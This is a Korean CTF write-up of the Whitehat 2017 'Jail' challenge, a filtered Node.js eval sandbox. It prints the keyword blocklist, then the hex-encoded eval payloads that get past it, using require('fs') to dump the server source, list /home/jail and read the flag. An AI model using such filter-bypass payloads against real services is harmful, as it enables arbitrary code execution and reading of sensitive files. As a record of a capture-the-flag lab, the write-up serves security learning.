# [Misc] Whitehat 2017 - Jail

## Description

>  nc challenges.whitehatcontest.kr 5959

## Analysis

nc를 통해 접속하면 다음과 같은 화면이 나온다.

```
$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
>
```

뭔지 모르겠으니 hint를 입력해보았다.

```
> hint
(input) => (new RegExp(/with|\.|;|new| |'|child|crypto|os|http|dns|net|tr|tty|zlib|punycode|util|url|ad|nc|>|`|\+|ex|=/i).test(input))
```

엄청많은 필터링들이 걸려있다.

근데 딱보니 무언가를 필터링 안했다.

hex을 사용하여 eval이 가능해보인다.

## Exploit

쿼리를 with(require('fs')){readFileSync(__filename)}로 보내야 하는데 필터링에 걸리게 되어있다.

이를 hex으로 변환시킨 후 eval을 통해 실행시켜보자.

Query : eval("with(require('fs')){readFileSync(__filename)}")

Encoded Query : eval("\x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x5f\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65\x29\x7d")

```js
$ nc challenges.whitehatcontest.kr 5959
Hello Java-Script Jail
type: hint, quit
> eval("\x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x5f\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65\x29\x7d")

your input /* eslint-disable no-unused-vars,no-console, no-undefined, no-underscore-dangle */
const readline = require('readline');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const checker = (input) => (new RegExp(/with|\.|;|new| |'|child|crypto|os|http|dns|net|tr|tty|zlib|punycode|util|url|ad|nc|>|`|\+|ex|=/i).test(input));

const result = (answer) =>{
  const Array = undefined;
  const Boolean = undefined;
  const Date = undefined;
  const global = undefined;
  const Error = undefined;
  const EvalError = undefined;
  const Function = undefined;
  const Number = undefined;
  const Object = undefined;
  const RangeError = undefined;
  const ReferenceError = undefined;
  const String = undefined;
  const SyntaxError = undefined;
  const TypeError = undefined;
  const URIError = undefined;
  const JSON = undefined;
  const Math = undefined;
  const decodeURIComponent = undefined;
  const encodeURI = undefined;
  const encodeURIComponent = undefined;
  const isFinite = undefined;
  const isNaN = undefined;
  const parseFloat = undefined;
  const parseInt = undefined;
  const ArrayBuffer = undefined;
  const DTRACE_HTTP_CLIENT_REQUEST = undefined;
  const DTRACE_HTTP_CLIENT_RESPONSE = undefined;
  const DTRACE_HTTP_SERVER_REQUEST = undefined;
  const DTRACE_HTTP_SERVER_RESPONSE = undefined;
  const DTRACE_NET_SERVER_CONNECTION = undefined;
  const DTRACE_NET_STREAM_END = undefined;
  const DataView = undefined;
  const Float32Array = undefined;
  const Float64Array = undefined;
  const Int16Array = undefined;
  const Int32Array = undefined;
  const Int8Array = undefined;
  const Map = undefined;
  const Promise = undefined;
  const Proxy = undefined;
  const Set = undefined;
  const Symbol = undefined;
  const Uint16Array = undefined;
  const Uint32Array = undefined;
  const Uint8Array = undefined;
  const Uint8ClampedArray = undefined;
  const WeakMap = undefined;
  const WeakSet = undefined;
  const assert = undefined;
  const clearImmediate = undefined;
  const clearInterval = undefined;
  const clearTimeout = undefined;
  const escape = undefined;
  const events = undefined;
  const setImmediate = undefined;
  const setInterval = undefined;
  const setTimeout = undefined;
  const stream = undefined;
  const unescape = undefined;
  const __defineGetter__ = undefined;
  const __defineSetter__ = undefined;
  const __lookupGetter__ = undefined;
  const __lookupSetter__ = undefined;
  const constructor = undefined;
  const hasOwnProperty = undefined;
  const isPrototypeOf = undefined;
  const propertyIsEnumerable = undefined;
  const toLocaleString = undefined;
  const toString = undefined;
  const valueOf = undefined;
  const rl = undefined;

  try{
    const clean = decodeURI(answer);
    if(checker(clean)) {
      console.log('nop');
      process.exit();
    }
    console.log('your input ' + eval(clean));
  }catch(e) {
    console.log('hm..');
    process.exit();
  }
  return;
};

console.log('Hello Java-Script Jail');
console.log('type: hint, quit');
rl.prompt();
rl.on('line', (line) => {
  switch (line.trim()) {
    case 'hint':
      console.log(checker.toString());
      break;
    case '555ca7cfed49489017c105cb13c557a068cf970c':
      console.log(result.toString());
      break;
    case 'quit':
      process.exit(0);
      break;
    default:
      result(line);
      break;
  }
  rl.prompt();
}).on('close', () => {
  console.log('Bye!');
  process.exit(0);
});

>
```

Jail문제의 소스를 얻었으나, 해당 파일에는 플래그가 안보이므로, Directory Traversal을 하였다.

`("with(require('fs')){readdirSync('/home/jail/')}")`을 삽입하였을 때, 디렉토리에 flag라는게 존재하는 것을 확인할 수 있었다.

이제 다음의 쿼리를 이용하여 Flag를 얻어보자.

Query : eval("with(require('fs')){readFileSync('/home/jail/flag')}")

Encoded Query : eval("\x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x27\x2f\x68\x6f\x6d\x65\x2f\x6a\x61\x69\x6c\x2f\x66\x6c\x61\x67\x27\x29\x7d")

```
> eval("\x77\x69\x74\x68\x28\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29\x29\x7b\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63\x28\x27\x2f\x68\x6f\x6d\x65\x2f\x6a\x61\x69\x6c\x2f\x66\x6c\x61\x67\x27\x29\x7d")
your input flag is {easy~esay!easy?_Jav4-scr1pt~yay}
```

Flag를 얻을 수 있었다.



**{easy~esay!easy?_Jav4-scr1pt~yay}**